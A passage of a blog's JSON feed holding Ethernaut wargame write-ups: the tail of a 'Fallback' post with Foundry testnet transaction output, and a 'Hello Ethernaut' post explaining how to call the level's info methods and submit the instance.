class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH <span class=\"o\">(</span>47965 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH <span class=\"o\">(</span>30364 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallback",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            "title": "Hello Ethernaut",
            "summary": null,
            "content_text": "Look into the level’s info method contract.info()  or await contract.info()  if you’re using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.after transaction called, clik the “Submit Instance” button",
            "content_html": "<p>Look into the level’s info method <code class=\"language-plaintext highlighter-rouge\">contract.info()</code>  or <code class=\"language-plaintext highlighter-rouge\">await contract.info()</code>  if you’re using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info().png\" alt=\"Image await contract.info()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info1().png\" alt=\"Image await contract.info1()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info2().png\" alt=\"Image await contract.info2()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_infoNum().png\" alt=\"Image await contract.infoNum()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info42().png\" alt=\"Image await contract.info42()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_theMethodName().png\" alt=\"Image await contract.theMethodName()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_method7123949().png\" alt=\"Image await contract.method7123949()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_authenticate().png\" alt=\"Image await contract.authenticate()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/mm.png\" alt=\"Image Metamask\" /></p><p>after transaction called, clik the “Submit Instance” button</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            
            
            
            "tags": ["blockchain","ethernaut"],
            
            "date_published": "2025-04-16T00:00:00+09:00",
            "date_modified": "2025-04-16T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}